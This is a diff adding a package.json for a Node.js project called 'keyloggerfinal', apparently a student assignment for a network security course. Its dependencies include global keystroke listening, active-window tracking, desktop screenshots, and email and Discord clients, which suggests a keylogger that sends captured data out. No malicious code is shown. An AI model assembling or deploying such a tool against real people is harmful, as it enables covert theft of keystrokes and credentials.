@@ -1,0 +1,28 @@
+{
+  "name": "keyloggerfinal",
+  "version": "1.0.0",
+  "description": "This is Our Project in Network Assurance and Security and this is developed by: Laurence, Andrea & Ylaiza of BSCS 3B",
+  "main": "keyloggerfinal.js",
+  "bin": "keyloggerfinal.js",
+  "scripts": {
+    "test": "node keyloggerfinal.js"
+  },
+  "repository": {
+    "type": "git",
+    "url": "keylogger"
+  },
+  "keywords": [
+    "keylogger",
+    "node",
+    "js"
+  ],
+  "author": "Laurence, Andrea & Ylaiza",
+  "license": "ISC",
+  "dependencies": {
+    "active-win": "^8.1.0",
+    "discord.js": "^14.13.0",
+    "node-global-key-listener": "^0.1.1",
+    "nodemailer": "^6.9.5",
+    "screenshot-desktop": "^1.15.0"
+  }
+}
